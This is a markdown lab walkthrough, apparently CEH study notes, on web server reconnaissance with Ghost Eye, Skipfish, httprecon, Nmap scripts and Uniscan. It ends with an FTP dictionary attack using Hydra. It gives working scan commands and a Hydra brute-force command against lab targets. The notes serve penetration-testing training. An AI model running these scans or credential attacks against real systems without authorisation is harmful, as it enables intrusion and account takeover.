## Information gathering using Ghost Eye
+ Ghost Eye is an information-gathering tool written in Python 3. To run, Ghost Eye only needs a domain or IP
+ Ghost Eye gathers information such as Whois lookup, DNS lookup, EtherApe, Nmap port scan, HTTP header grabber, Clickjacking test, Robots.txt scanner, Link grabber, IP location finder, and traceroute.

![a](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/404d0d91-3ff5-43a8-b639-7483cdca8a71)

### Whois lookup
![b](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/1c3bc55d-463b-49d7-8088-afab3cec3a78)

### Clickjacking 

![c](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/7f07a94a-a5fb-43d7-be39-255707844fa3)


## Perform Web Server Reconnaissance using Skipfish

Skipfish is an active web application (deployed on a webserver) security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks.


![d](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/cf4b685f-89a5-4a87-a34e-51cbd8c55d98)

![e](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/8eaaf467-aa32-45c6-96a5-21bd56fe952a)

![f](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/8f9938a3-2185-45c3-a54d-6a29fedea113)

# Footprint a Web Server using the httprecon Tool

httprecon is a tool for advanced web server fingerprinting. This tool performs banner-grabbing attacks, status code enumeration, and header ordering analysis on its target web server.

![g](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/71f6ecf2-e220-4d0c-a255-d9ee47b4b3ba)

## Enumerate Web Server Information using Nmap Scripting Engine (NSE)
+ Enumerate the directories used by web servers and web applications.
  ```
  nmap -sV --script=http-enum [target website]
  ```
![h](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/8ad9696b-9ec0-4fa5-9725-005c64b2ec6d)

+ To discover the hostnames that resolve the targeted domain.
```
  nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com
```
+ Check whether Web Application Firewall is configured on the target host or domain.
```
  nmap -p80 --script http-waf-detect www.goodshopping.com
```
![i](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/d1dcbb63-c34f-4687-8d30-63eac4065e41)

## Uniscan Web Server Fingerprinting
Uniscan is a versatile server fingerprinting tool that not only performs simple commands like ping, traceroute, and nslookup, but also does static, dynamic, and stress checks on a web server. 
+ To search for dirtories
```
  uniscan -u http:url -q
```
+ use the dynamic testing option by giving the command -d
```
 uniscan -u http://10.10.1.22:8080/CEH -d
```
![j](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/73f26c15-ca90-404a-907f-842adc3cf738)

Result are stored as a html page in uniscan directory with IP of the domain a file name.

## Perform a Web Server Attack
## Crack FTP Credentials using a Dictionary Attack
1. Perform nmap to check ftp is open in target server.
```
  nmap -p 21 target_IP
```
![k](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/7bf1a7a2-d25c-4c75-bb28-0dd50a9cceb5)

2. Check FTP server is hosted
```
  ftp target_IP
```
![l](https://github.com/Kr1shna02/Hack_Flow/assets/117007783/62e64373-1c3b-4bd0-b097-c1e7a68f8384)

3. Now perform password cracking attack using Hydra
```
  hydra -L username.txt -P password.txt fpt://target_IP
```
If the password of FTP is weak the we can get the username and password .And we can login as legitimate user.

